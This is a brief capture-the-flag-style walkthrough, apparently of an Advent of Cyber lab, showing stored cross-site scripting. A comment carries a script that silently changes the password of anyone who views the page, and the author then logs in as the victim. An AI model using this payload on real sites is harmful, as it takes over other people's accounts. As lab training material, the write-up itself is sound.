# XSS Vulnerability

[If you want to check my notes about XSS](https://github.com/itKhalid143/websec365/blob/main/Days/Day10-XSS.md)

***
## First we're logging in using the given Credentials!

```php
Username: McSkidy

Password: password
```
![****](/Advent%20of%20Cyber%203/Screenshots/Task5/login.PNG)

## Then we'll be looking forblog post to inject our malicious script in the comment section!
```js
<script>fetch('/settings?new_password=pass123');</script>
``` 
- ```<script> Text in Between </script> ``` Allows to run Javascripts inside our page.

- ```fetch``` function makes a network request to the specified URL.

![****](/Advent%20of%20Cyber%203/Screenshots/Task5/1.PNG)

Once the target visits the blog we posted, the code will automatically make a request using the fetch function to the given link to change the password of who ever seen that page!

![****](/Advent%20of%20Cyber%203/Screenshots/Task5/2.PNG)

## Here we see how our command is injected into the source code!

## Lately we're logging in with the new password we set in our malicious code!

```php
Username: grinch

Password: pass123
```
![****](/Advent%20of%20Cyber%203/Screenshots/Task5/3.PNG)

## Well done Hackers!